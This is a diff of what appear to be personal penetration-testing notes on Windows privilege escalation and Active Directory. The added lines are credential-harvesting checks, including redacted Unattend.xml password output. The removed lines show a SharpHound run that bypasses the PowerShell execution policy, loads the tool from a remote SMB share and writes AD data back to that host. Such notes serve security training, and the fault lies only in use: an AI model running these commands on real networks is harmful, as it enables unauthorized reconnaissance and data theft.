@@ -121,24 +121,19 @@ get-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
 # Credential harvesting
 
 - cmdkeyなし
+- powershell history
+
+- Unattendはパスワード消されている
+```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
+    C:\Windows\Panther\Unattend.xml
+<Password>*SENSITIVE*DATA*DELETED*</Password>					</LocalAccount>				</LocalAccounts>			</UserAccounts>			<AutoLogon>				<Username>Admin</Username>				<Enabled>true</Enabled>				<LogonCount>1</LogonCount>				<Password>*SENSITIVE*DATA*DELETED*</Password>
+```
 
 ---
 
 # AD
 
-## Auto w/ BloodHound
-
-```zsh
-# Attacker(作成済みのSMB共有を使う)
-cp /opt/bloodhound/SharpHound.ps1 share
-```
-```powershell
-# Target
-powershell -ep bypass
-net use \\192.168.49.104\share /user:username pw
-Import-Module \\192.168.49.104\share\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.104\share -ZipFileName 'audit.zip'
-```
 
 ---
 
